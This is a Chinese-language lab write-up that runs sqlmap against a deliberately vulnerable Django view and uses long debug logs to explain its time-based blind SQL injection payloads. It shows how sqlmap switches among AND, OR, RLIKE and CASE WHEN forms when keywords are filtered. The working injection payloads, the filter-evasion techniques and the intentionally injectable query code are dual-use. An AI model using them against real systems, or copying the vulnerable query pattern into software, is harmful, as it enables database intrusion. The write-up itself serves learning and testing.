@@ -1,0 +1,1177 @@
+使用django搭建了一个注入靶机
+
+    
+    
+    def te(request):
+        id = request.GET.get("id")
+    
+        db = pymysql.connect("127.0.0.1", "root", "123456", "t1", charset='utf8')
+        cursor = db.cursor()
+        cursor.execute("SELECT * FROM test where id =" + id)
+        data = cursor.fetchone()
+    
+        db.close()
+        return HttpResponse(data[1])
+
+正常页面
+
+![image.png](https://image.3001.net/images/20191227/1577456169_5e061229c903d.png!small)加上单引号
+
+![image.png](https://image.3001.net/images/20191227/1577456198_5e0612465e36e.png!small)在SQLMAP注入检测技术有这几种
+
+![image.png](https://image.3001.net/images/20191227/1577456262_5e0612860c945.png!small)  
+
+# 基于时间注入(T)
+
+注入命令
+
+    
+    
+    --level 5 --risk 3 --batch --dbms=mysql -v 3 -p id --flush-session  --technique=T
+    
+    
+    
+    [22:19:32] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+    [22:19:32] [PAYLOAD] 1) AND SLEEP(5)-- RfYH
+    [22:19:32] [WARNING] time-based comparison requires larger statistical model, please wait............................ (done)
+    [22:19:33] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:19:33] [PAYLOAD] 1) AND SLEEP(5) AND (9830=9830
+    [22:19:33] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:19:33] [PAYLOAD] 1)) AND SLEEP(5) AND ((9685=9685
+    [22:19:33] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:19:33] [PAYLOAD] 1))) AND SLEEP(5) AND (((6020=6020
+    [22:19:33] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:19:33] [PAYLOAD] 1 AND SLEEP(5)
+    [22:19:38] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:19:38] [PAYLOAD] 1 AND SLEEP(0)
+    [22:19:38] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:19:38] [PAYLOAD] 1 AND SLEEP(5)
+    [22:19:43] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:19:43] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
+    [22:19:43] [PAYLOAD] 1 AND 6670=IF((61=61),SLEEP(5),6670)
+    [22:19:48] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:19:48] [PAYLOAD] 1 AND 6666=IF((61=78),SLEEP(5),6666)
+    [22:19:48] [PAYLOAD] 1 AND 4347=IF((61=99),SLEEP(5),4347)
+    [22:19:48] [PAYLOAD] 1 AND 4376=IF((99=78),SLEEP(5),4376)
+    [22:19:48] [PAYLOAD] 1 AND 3045=IF((78=78),SLEEP(5),3045)
+    [22:19:53] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:19:53] [PAYLOAD] 1 AND 7064=IF((99 78),SLEEP(5),7064)
+    [22:19:53] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:19:53] [PAYLOAD] 1 AND 4629=IF((16=16),SLEEP(5),4629)
+    [22:19:58] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:19:58] [PAYLOAD] 1 AND 5264=IF((16=40),SLEEP(5),5264)
+    [22:19:58] [PAYLOAD] 1 AND 6070=IF((16=93),SLEEP(5),6070)
+    [22:19:58] [PAYLOAD] 1 AND 7543=IF((93=40),SLEEP(5),7543)
+    [22:19:58] [PAYLOAD] 1 AND 3147=IF((40=40),SLEEP(5),3147)
+    [22:20:03] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:20:04] [PAYLOAD] 1 AND 8849=IF((93 40),SLEEP(5),8849)
+    [22:20:04] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:20:04] [PAYLOAD] 1 AND 8037=IF((11=11),SLEEP(5),8037)
+    [22:20:09] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:20:09] [PAYLOAD] 1 AND 1374=IF((11=19),SLEEP(5),1374)
+    [22:20:09] [PAYLOAD] 1 AND 7006=IF((11=55),SLEEP(5),7006)
+    [22:20:09] [PAYLOAD] 1 AND 9634=IF((55=19),SLEEP(5),9634)
+    [22:20:09] [PAYLOAD] 1 AND 9001=IF((19=19),SLEEP(5),9001)
+    [22:20:14] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:20:14] [PAYLOAD] 1 AND 8633=IF((55 19),SLEEP(5),8633)
+    [22:20:14] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:20:14] [PAYLOAD] 1 AND 3268=IF((39=39),SLEEP(5),3268)
+    [22:20:19] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:20:19] [PAYLOAD] 1 AND 8941=IF((39=95),SLEEP(5),8941)
+    [22:20:19] [PAYLOAD] 1 AND 8749=IF((39=99),SLEEP(5),8749)
+    [22:20:19] [PAYLOAD] 1 AND 3479=IF((99=95),SLEEP(5),3479)
+    [22:20:19] [PAYLOAD] 1 AND 7395=IF((95=95),SLEEP(5),7395)
+    [22:20:24] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:20:24] [PAYLOAD] 1 AND 7236=IF((99 95),SLEEP(5),7236)
+    [22:20:24] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:20:24] [PAYLOAD] 1 AND 2647=IF((16=16),SLEEP(5),2647)
+    [22:20:29] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:20:29] [PAYLOAD] 1 AND 1648=IF((16=18),SLEEP(5),1648)
+    [22:20:29] [PAYLOAD] 1 AND 9955=IF((16=72),SLEEP(5),9955)
+    [22:20:29] [PAYLOAD] 1 AND 5891=IF((72=18),SLEEP(5),5891)
+    [22:20:29] [PAYLOAD] 1 AND 2035=IF((18=18),SLEEP(5),2035)
+    [22:20:34] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:20:34] [PAYLOAD] 1 AND 9912=IF((72 18),SLEEP(5),9912)
+    [22:20:34] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:20:34] [DEBUG] checking for parameter length constrainting mechanisms
+    [22:20:34] [PAYLOAD] 1 AND 7575=IF((4938=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                4938),SLEEP(5),7575)
+    [22:20:39] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:20:39] [DEBUG] checking for filtered characters
+    [22:20:39] [PAYLOAD] 1 AND 3720=IF((5937>5936),SLEEP(5),3720)
+    [22:20:44] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+    [22:20:44] [DEBUG] used the default behaviour, running in batch mode
+    sqlmap identified the following injection point(s) with a total of 67 HTTP(s) requests:
+    ---    Parameter: id (GET)
+        Type: AND/OR time-based blind
+        Title: MySQL >= 5.0.12 AND time-based blind
+        Payload: id=1 AND SLEEP(5)
+        Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+    ---    [22:20:44] [INFO] the back-end DBMS is MySQL
+    back-end DBMS: MySQL >= 5.0.12
+
+使用这个payload的时候，测试能不能使用if函数，如果if成功则会睡眠5秒，
+
+![image.png](https://image.3001.net/images/20191227/1577456883_5e0614f32a16a.png!small)否则返回6670，而6670又等于外面的6670，所以会返回1  
+
+![image.png](https://image.3001.net/images/20191227/1577457030_5e061586471a6.png!small)
+**假如我禁止使用字符串AND**
+
+![image.png](https://image.3001.net/images/20191227/1577457439_5e06171f60c18.png!small)
+sqlmap就会自己选择or
+
+![image.png](https://image.3001.net/images/20191227/1577457504_5e0617601be93.png!small)![image.png](https://image.3001.net/images/20191227/1577457551_5e06178fe5ddc.png!small)当使用or+slee(5)的时候，无法执行sleep
+
+    
+    
+    [22:35:43] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (comment)'
+    [22:35:43] [PAYLOAD] 1) OR SLEEP(5)#
+    [22:35:43] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:43] [PAYLOAD] 1)) OR SLEEP(5)#
+    [22:35:43] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:43] [PAYLOAD] 1))) OR SLEEP(5)#
+    [22:35:43] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:43] [PAYLOAD] 1 OR SLEEP(5)#
+    [22:35:43] [PAYLOAD] 1) WHERE 1129=1129 OR SLEEP(5)#
+    [22:35:43] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:43] [PAYLOAD] 1 WHERE 5039=5039 OR SLEEP(5)#
+    [22:35:43] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:43] [PAYLOAD] 1)) AS aXdd WHERE 6537=6537 OR SLEEP(5)#
+    [22:35:43] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:43] [PAYLOAD] 1) AS yosm WHERE 7331=7331 OR SLEEP(5)#
+    [22:35:43] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:43] [PAYLOAD] 1` WHERE 3927=3927 OR SLEEP(5)#
+    [22:35:43] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:43] [PAYLOAD] 1`) WHERE 9536=9536 OR SLEEP(5)#
+    [22:35:44] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:44] [PAYLOAD] 1') OR SLEEP(5)#
+    [22:35:44] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:44] [PAYLOAD] 1' OR SLEEP(5)#
+    [22:35:44] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:44] [PAYLOAD] 1" OR SLEEP(5)#
+    [22:35:44] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:44] [PAYLOAD] 1')) OR SLEEP(5)#
+    [22:35:44] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:44] [PAYLOAD] 1'))) OR SLEEP(5)#
+    [22:35:44] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:44] [PAYLOAD] 1") OR SLEEP(5)#
+    [22:35:44] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:44] [PAYLOAD] 1")) OR SLEEP(5)#
+    [22:35:44] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:44] [PAYLOAD] 1"))) OR SLEEP(5)#
+    [22:35:44] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:44] [PAYLOAD] 1%') OR SLEEP(5)#
+    [22:35:44] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:44] [PAYLOAD] 1%')) OR SLEEP(5)#
+    [22:35:44] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:44] [PAYLOAD] 1%'))) OR SLEEP(5)#
+    [22:35:44] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:44] [PAYLOAD] 1%' OR SLEEP(5)#
+    [22:35:44] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:44] [PAYLOAD] 1%") OR SLEEP(5)#
+    [22:35:44] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:44] [PAYLOAD] 1%")) OR SLEEP(5)#
+    [22:35:44] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:44] [PAYLOAD] 1%"))) OR SLEEP(5)#
+    [22:35:45] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:45] [PAYLOAD] 1%" OR SLEEP(5)#
+    [22:35:45] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:45] [PAYLOAD] 1') WHERE 1477=1477 OR SLEEP(5)#
+    [22:35:45] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:45] [PAYLOAD] 1") WHERE 2319=2319 OR SLEEP(5)#
+    [22:35:45] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:45] [PAYLOAD] 1' WHERE 5508=5508 OR SLEEP(5)#
+    [22:35:45] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:45] [PAYLOAD] 1" WHERE 9299=9299 OR SLEEP(5)#
+    [22:35:45] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:45] [PAYLOAD] 1'||(SELECT 'gxbY' FROM DUAL WHERE 3409=3409 OR SLEEP(5)#
+    [22:35:45] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:45] [PAYLOAD] 1'||(SELECT 'XQiD' WHERE 6808=6808 OR SLEEP(5)#
+    [22:35:45] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:45] [PAYLOAD] 1'+(SELECT MsiW WHERE 5089=5089 OR SLEEP(5)#
+    [22:35:45] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:45] [PAYLOAD] 1'+(SELECT 'tHYQ' WHERE 6487=6487 OR SLEEP(5)#
+    [22:35:45] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:45] [PAYLOAD] 1')) AS EeuT WHERE 2138=2138 OR SLEEP(5)#
+    [22:35:45] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:45] [PAYLOAD] 1")) AS zUfI WHERE 4750=4750 OR SLEEP(5)#
+    [22:35:45] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:45] [PAYLOAD] 1') AS NSxT WHERE 1030=1030 OR SLEEP(5)#
+    [22:35:45] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:35:45] [PAYLOAD] 1") AS jGtE WHERE 8551=8551 OR SLEEP(5)#
+    [22:35:45] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+
+就会切换成这种模式
+
+    
+    
+    [22:35:56] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+    [22:35:56] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(37=37,0,5)))))Drzz)
+    [22:36:01] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(37=62,0,5)))))uxWh)
+    [22:36:01] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(37=75,0,5)))))gkcr)
+    [22:36:01] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(75=62,0,5)))))HftH)
+    [22:36:01] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(62=62,0,5)))))PEif)
+    [22:36:06] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(75 62,0,5)))))rIqx)
+    [22:36:06] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:36:06] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(41=41,0,5)))))AiYm)
+    [22:36:11] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(41=48,0,5)))))ksnP)
+    [22:36:11] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(41=60,0,5)))))hfID)
+    [22:36:11] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(60=48,0,5)))))FdQf)
+    [22:36:11] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(48=48,0,5)))))sOgu)
+    [22:36:16] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(60 48,0,5)))))nQeP)
+    [22:36:16] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:36:16] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(12=12,0,5)))))BobY)
+    [22:36:21] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(12=39,0,5)))))Vnya)
+    [22:36:22] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(12=90,0,5)))))dioX)
+    [22:36:22] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(90=39,0,5)))))uINL)
+    [22:36:22] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(39=39,0,5)))))UhqQ)
+    [22:36:27] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(90 39,0,5)))))aHQG)
+    [22:36:27] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:36:27] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(39=39,0,5)))))BVgV)
+    [22:36:32] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(39=57,0,5)))))uDwn)
+    [22:36:32] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(39=72,0,5)))))OtdM)
+    [22:36:32] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(72=57,0,5)))))XExQ)
+    [22:36:32] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(57=57,0,5)))))MeGs)
+    [22:36:37] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(72 57,0,5)))))USnO)
+    [22:36:37] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:36:37] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(38=38,0,5)))))kNFY)
+    [22:36:42] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(38=39,0,5)))))LZUq)
+    [22:36:42] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(38=62,0,5)))))CbGw)
+    [22:36:42] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(62=39,0,5)))))fatr)
+    [22:36:42] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(39=39,0,5)))))wnqf)
+    [22:36:47] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(62 39,0,5)))))vOsj)
+    [22:36:47] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:36:47] [DEBUG] checking for parameter length constrainting mechanisms
+    [22:36:47] [PAYLOAD] 1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(2557=       
+
+成功睡眠
+
+![image.png](https://image.3001.net/images/20191227/1577457859_5e0618c37289f.png!small)它将结果作为一个子查询作为一个表，后面那个Drzz是作为别名返回。
+
+    
+    
+    1 OR (SELECT * FROM (SELECT(SLEEP(5-(IF(37=37,0,5)))))Drzz)
+
+ **假如禁掉的是AND,IF字符串，就会失败**
+
+![image.png](https://image.3001.net/images/20191227/1577458421_5e061af5b4f25.png!small)
+**假如禁掉的是AND,OR字符串**
+
+    
+    
+    在MySQL中，RLIKE运算符用于确定字符串是否匹配正则表达式。它是REGEXP_LIKE()的同义词。
+    如果字符串与提供的正则表达式匹配，则结果为1，否则为0。
+    
+    
+    
+    [22:59:15] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+    [22:59:15] [PAYLOAD] 1 RLIKE (SELECT 6936=IF((30=30),SLEEP(5),6936))
+    [22:59:20] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:59:21] [PAYLOAD] 1 RLIKE (SELECT 1879=IF((30=59),SLEEP(5),1879))
+    [22:59:21] [PAYLOAD] 1 RLIKE (SELECT 4259=IF((30=79),SLEEP(5),4259))
+    [22:59:21] [PAYLOAD] 1 RLIKE (SELECT 1368=IF((79=59),SLEEP(5),1368))
+    [22:59:22] [PAYLOAD] 1 RLIKE (SELECT 2671=IF((59=59),SLEEP(5),2671))
+    [22:59:27] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:59:27] [PAYLOAD] 1 RLIKE (SELECT 6464=IF((79 59),SLEEP(5),6464))
+    [22:59:27] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:59:27] [PAYLOAD] 1 RLIKE (SELECT 8940=IF((34=34),SLEEP(5),8940))
+    [22:59:32] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:59:32] [PAYLOAD] 1 RLIKE (SELECT 4099=IF((34=69),SLEEP(5),4099))
+    [22:59:32] [PAYLOAD] 1 RLIKE (SELECT 4609=IF((34=85),SLEEP(5),4609))
+    [22:59:32] [PAYLOAD] 1 RLIKE (SELECT 5560=IF((85=69),SLEEP(5),5560))
+    [22:59:32] [PAYLOAD] 1 RLIKE (SELECT 8957=IF((69=69),SLEEP(5),8957))
+    [22:59:37] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:59:37] [PAYLOAD] 1 RLIKE (SELECT 2173=IF((85 69),SLEEP(5),2173))
+    [22:59:37] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:59:37] [PAYLOAD] 1 RLIKE (SELECT 1282=IF((27=27),SLEEP(5),1282))
+    [22:59:42] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:59:42] [PAYLOAD] 1 RLIKE (SELECT 7694=IF((27=77),SLEEP(5),7694))
+    [22:59:42] [PAYLOAD] 1 RLIKE (SELECT 6583=IF((27=93),SLEEP(5),6583))
+    [22:59:42] [PAYLOAD] 1 RLIKE (SELECT 9747=IF((93=77),SLEEP(5),9747))
+    [22:59:42] [PAYLOAD] 1 RLIKE (SELECT 9719=IF((77=77),SLEEP(5),9719))
+    [22:59:47] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:59:47] [PAYLOAD] 1 RLIKE (SELECT 6903=IF((93 77),SLEEP(5),6903))
+    [22:59:47] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:59:47] [PAYLOAD] 1 RLIKE (SELECT 2802=IF((29=29),SLEEP(5),2802))
+    [22:59:52] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:59:52] [PAYLOAD] 1 RLIKE (SELECT 8059=IF((29=44),SLEEP(5),8059))
+    [22:59:52] [PAYLOAD] 1 RLIKE (SELECT 5050=IF((29=69),SLEEP(5),5050))
+    [22:59:52] [PAYLOAD] 1 RLIKE (SELECT 6203=IF((69=44),SLEEP(5),6203))
+    [22:59:52] [PAYLOAD] 1 RLIKE (SELECT 6233=IF((44=44),SLEEP(5),6233))
+    [22:59:57] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:59:57] [PAYLOAD] 1 RLIKE (SELECT 2840=IF((69 44),SLEEP(5),2840))
+    [22:59:57] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [22:59:57] [PAYLOAD] 1 RLIKE (SELECT 5151=IF((32=32),SLEEP(5),5151))
+    [23:00:02] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:00:02] [PAYLOAD] 1 RLIKE (SELECT 9793=IF((32=71),SLEEP(5),9793))
+    [23:00:02] [PAYLOAD] 1 RLIKE (SELECT 6044=IF((32=83),SLEEP(5),6044))
+    [23:00:02] [PAYLOAD] 1 RLIKE (SELECT 6513=IF((83=71),SLEEP(5),6513))
+    [23:00:02] [PAYLOAD] 1 RLIKE (SELECT 7971=IF((71=71),SLEEP(5),7971))
+    [23:00:07] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:00:07] [PAYLOAD] 1 RLIKE (SELECT 3576=IF((83 71),SLEEP(5),3576))
+    [23:00:08] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:00:08] [DEBUG] checking for parameter length constrainting mechanisms
+    [23:00:08] [PAYLOAD] 1 RLIKE (SELECT 4796=IF((9305=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                9305),SLEEP(5),4796))
+    [23:00:13] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:00:13] [DEBUG] checking for filtered characters
+    [23:00:13] [PAYLOAD] 1 RLIKE (SELECT 7423=IF((2249>2248),SLEEP(5),7423))
+    
+
+**假如禁掉的是AND,OR，RLIKE字符串**
+
+    
+    
+    数据SQL CASE 表达式是一种通用的条件表达式，类似于其它语言中的 if/else 语句。 
+    
+    CASE WHEN condition THEN result 
+    　　　WHEN condition THEN result 
+    　　　.............
+    　　　[WHEN ...] 
+    　　　[ELSE result] 
+    END 
+    CASE 子句可以用于任何表达式可以有效存在的地方。 condition 是一个返回boolean 的表达式。 如果结果为真，那么 CASE 表达式的结果就是符合条件的 result。 如果结果为假，那么以相同方式搜寻任何随后的 WHEN 子句。 如果没有 WHEN condition 为真，那么 case 表达式的结果就是在 ELSE 子句里的值。 如果省略了 ELSE 子句而且没有匹配的条件， 结果为 NULL。
+    或其语法为：
+    简单Case函数 
+    CASE sex 
+             WHEN '1' THEN '男' 
+             WHEN '2' THEN '女' 
+    ELSE '其他' END 
+    建议都使用第一种，少
+    
+    
+    
+    [23:03:11] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+    [23:03:11] [PAYLOAD] (CASE WHEN (13=13) THEN SLEEP(5) ELSE 9315 END)
+    [23:03:16] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:16] [PAYLOAD] (CASE WHEN (13=29) THEN SLEEP(5) ELSE 2370 END)
+    [23:03:16] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:16] [PAYLOAD] (CASE WHEN (13=56) THEN SLEEP(5) ELSE 9841 END)
+    [23:03:16] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:16] [PAYLOAD] (CASE WHEN (56=29) THEN SLEEP(5) ELSE 8206 END)
+    [23:03:16] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:16] [PAYLOAD] (CASE WHEN (29=29) THEN SLEEP(5) ELSE 7582 END)
+    [23:03:22] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:22] [PAYLOAD] (CASE WHEN (56 29) THEN SLEEP(5) ELSE 7064 END)
+    [23:03:22] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:22] [PAYLOAD] (CASE WHEN (52=52) THEN SLEEP(5) ELSE 1764 END)
+    [23:03:27] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:27] [PAYLOAD] (CASE WHEN (52=88) THEN SLEEP(5) ELSE 3749 END)
+    [23:03:27] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:27] [PAYLOAD] (CASE WHEN (52=95) THEN SLEEP(5) ELSE 7047 END)
+    [23:03:27] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:27] [PAYLOAD] (CASE WHEN (95=88) THEN SLEEP(5) ELSE 9320 END)
+    [23:03:27] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:27] [PAYLOAD] (CASE WHEN (88=88) THEN SLEEP(5) ELSE 7829 END)
+    [23:03:32] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:32] [PAYLOAD] (CASE WHEN (95 88) THEN SLEEP(5) ELSE 1663 END)
+    [23:03:32] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:32] [PAYLOAD] (CASE WHEN (51=51) THEN SLEEP(5) ELSE 8885 END)
+    [23:03:37] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:37] [PAYLOAD] (CASE WHEN (51=75) THEN SLEEP(5) ELSE 2713 END)
+    [23:03:37] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:37] [PAYLOAD] (CASE WHEN (51=89) THEN SLEEP(5) ELSE 2195 END)
+    [23:03:37] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:37] [PAYLOAD] (CASE WHEN (89=75) THEN SLEEP(5) ELSE 6522 END)
+    [23:03:37] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:37] [PAYLOAD] (CASE WHEN (75=75) THEN SLEEP(5) ELSE 4869 END)
+    [23:03:42] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:42] [PAYLOAD] (CASE WHEN (89 75) THEN SLEEP(5) ELSE 7742 END)
+    [23:03:42] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:42] [PAYLOAD] (CASE WHEN (52=52) THEN SLEEP(5) ELSE 7375 END)
+    [23:03:47] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:48] [PAYLOAD] (CASE WHEN (52=60) THEN SLEEP(5) ELSE 7982 END)
+    [23:03:48] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:48] [PAYLOAD] (CASE WHEN (52=85) THEN SLEEP(5) ELSE 9535 END)
+    [23:03:48] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:48] [PAYLOAD] (CASE WHEN (85=60) THEN SLEEP(5) ELSE 1355 END)
+    [23:03:48] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:48] [PAYLOAD] (CASE WHEN (60=60) THEN SLEEP(5) ELSE 6053 END)
+    [23:03:53] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:53] [PAYLOAD] (CASE WHEN (85 60) THEN SLEEP(5) ELSE 1168 END)
+    [23:03:53] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:53] [PAYLOAD] (CASE WHEN (61=61) THEN SLEEP(5) ELSE 1220 END)
+    [23:03:58] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:58] [PAYLOAD] (CASE WHEN (61=63) THEN SLEEP(5) ELSE 1146 END)
+    [23:03:58] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:58] [PAYLOAD] (CASE WHEN (61=90) THEN SLEEP(5) ELSE 8312 END)
+    [23:03:58] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:03:58] [PAYLOAD] (CASE WHEN (90=63) THEN SLEEP(5) ELSE 7015 END)
+    [23:03:58] [DEBUG] got HTTP error code: 500 (Internal Server Error)
